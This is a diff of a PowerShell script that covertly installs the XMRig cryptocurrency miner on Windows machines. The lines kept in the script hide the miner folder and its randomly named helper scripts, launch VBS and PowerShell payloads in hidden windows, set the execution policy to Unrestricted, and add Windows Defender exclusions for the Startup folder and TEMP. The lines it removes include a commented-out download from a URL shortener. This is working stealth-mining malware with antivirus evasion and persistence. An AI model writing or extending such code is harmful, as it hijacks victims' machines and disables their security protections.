@@ -99,15 +99,6 @@ Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath 
 
 Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
-# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
-# if (Test-Path -Path $newConfigPath) {
-#     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-#     Write-Output "bat file has been replaced successfully."
-# } else {
-#     Write-Output "New bat file not found at the specified path."
-# }
-
 Remove-Item -Path "$initial_dir\ip.txt"
 
 Set-Location -Path 'C:\Users'
@@ -129,11 +120,7 @@ Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "
 
 cd $initial_dir
 
-#Invoke-WebRequest -UseBasicParsing -OutFile "edpnotify.ps1" -Uri "http://tiny.cc/g1pg001"
-
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
-
-#Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden
 
 Set-ItemProperty -Name Attributes -Path "$tasks\AEQKCPrkuifY.ps1" -Value "Hidden"
 
@@ -143,23 +130,11 @@ Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-# Start-Process -FilePath "$tasks\AEQKCPrkuifY.ps1" -windowstyle hidden
-
-# Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
-
-cd $initial_dir
 
 Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
 
-Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
-
-# Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
-
-Start-Sleep -Seconds 340
-# Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
-
-& "./TMqhONoBljEv.vbs"
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\ysAhVvSZMXDP.ps1`"" -NoNewWindow
 
 Start-Sleep -Seconds 340
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
